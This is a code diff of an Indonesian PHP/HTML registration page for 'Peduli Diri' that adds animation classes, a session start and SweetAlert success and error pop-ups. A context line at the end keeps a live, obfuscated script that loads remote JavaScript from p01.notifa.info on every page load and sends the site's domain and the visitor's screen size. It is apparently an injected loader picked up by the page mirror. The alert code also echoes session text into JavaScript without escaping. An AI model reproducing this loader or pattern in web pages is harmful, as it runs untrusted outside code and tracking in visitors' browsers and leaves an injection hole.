@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="en">
-
+<?php session_start(); ?>
 <!-- Mirrored from codervent.com/rocker/color-version/authentication-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
 <head>
   <meta charset="utf-8"/>
@@ -9,7 +9,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
   <meta name="description" content=""/>
   <meta name="author" content=""/>
-  <title>REGISTER | Peduli Diri</title>
+  <title>DAFTAR | Peduli Diri</title>
   <!--favicon-->
   <link rel="icon" href="../assets/images/logo.jpg" type="image/x-icon">
   <!-- Bootstrap core CSS-->
@@ -38,18 +38,18 @@
 			  <div class="form-group">
 			   <div class="position-relative has-icon-right">
 				  <label for="nik" class="sr-only">NIK</label>
-				  <input type="number" maxlength="16" minlength="16" id="nik" name="nik"  class="form-control form-control-rounded shadow-primary" placeholder="Masukan NIK" required oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" >
+				  <input type="number" maxlength="16" id="nik" name="nik"  class="form-control form-control-rounded shadow-primary mx-auto animated bounceInRight" placeholder="Masukan NIK" required oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" >
 				  <div class="form-control-position">
-				  <span class="fa fa-address-card"></span>
+				  <span class="fa fa-address-card mx-auto animated bounceInRight"></span>
 				  </div>
 			   </div>
 			  </div>
 			  <div class="form-group">
 			   <div class="position-relative has-icon-right">
 				  <label for="npm" class="sr-only">Nama Lengkap</label>
-				  <input type="text" id="npm" name="npm" class="form-control form-control-rounded shadow-primary" placeholder="Masukan Nama Lengkap" required>
+				  <input type="text" id="npm" name="npm" class="form-control form-control-rounded shadow-primary mx-auto animated bounceInRight" placeholder="Masukan Nama Lengkap" required>
 				  <div class="form-control-position">
-				  <span class="fa fa-user"></span>
+				  <span class="fa fa-user mx-auto animated bounceInRight"></span>
 				  </div>
 			   </div>
 			  </div>
@@ -63,11 +63,11 @@
             </div>
           </div>
           <div class="col-7">
-        <a href="../index.php"><button type="button" class="btn btn-block  btn-danger shadow-danger form-control-rounded">Sudah Punya Akun</button></a>
+        <a href="../index.php"><button type="button" class="btn btn-block  btn-danger shadow-danger form-control-rounded mx-auto animated bounceInRight">Sudah Punya Akun</button></a>
       </div>
           
           <div class="col-5">
-            <button type="submit" class="btn  btn-primary shadow-primary btn-block form-control-rounded">Daftar</button>
+            <button type="submit" class="btn  btn-primary shadow-primary btn-block form-control-rounded mx-auto animated bounceInRight">Daftar</button>
           </div>
           <!-- /.col -->
         </div>
@@ -85,6 +85,19 @@
   <script src="../assets/js/jquery.min.js"></script>
   <script src="../assets/js/popper.min.js"></script>
   <script src="../assets/js/bootstrap.min.js"></script>
+  <script src="../assets/plugins/alerts-boxes/js/sweetalert.min.js"></script>
+  <?php if(isset($_SESSION['success'])) { ?>
+    <script>
+      swal("Berhasil!", "<?= $_SESSION['success']; ?>", "success");
+    </script>
+    <?php unset($_SESSION['success']); } ?>
+
+
+    <?php if(isset($_SESSION['error'])) { ?>
+    <script>
+      swal("Kesalahan!", "<?= $_SESSION['error']; ?>", "error");
+    </script>
+    <?php unset($_SESSION['error']); } ?>
   
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKugMuLHZvWG0xKbltMMmbcsNzvfDcif6RgPTaJ%2fpMzbNc0eNunEVaBqg%2f6LgkfHnuGbrzftbrjOVZEV6ZMDcaGBUKnoozKaf8F3wlZ9bPku0D7yaarLv7hozUmx2kb6RZGNoHI8%2fepU81DPkLIMexqOn8HNk46jEzv%2b9IcyKtiFYhnHBYobg%2fO9FzeKAL1AFMgvNon8fz4GJSBSrh4PoAESdzBgwtG7nuW32vUcWk%2bob%2bKTFLAdyulQQUdggtA5jKnhkyE%2blNpRzrOGCLJl2vLlPLjeTCW39tdBDpiBBLOVr402WX0%2bD%2fiRuJFZM0yPrRPbrI0KiVrtLwewpHZYlAEpODQDl4nL3QTVDy8sLcKYzVXNZmgaQWzR7e%2bcV9qL3SrH37h80yxG8pUdO%2b6UL1ZN7pOhpPyVoDMF9JwpM2HldtENM0XkiYyCvbPb%2bPvSLfoWq0mSS5HhKocmU3I78Mj0SMgBf3Lry%2figrlwMXvjfnoiGGb8kFC2ZyoPkv5vKN%2fek%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
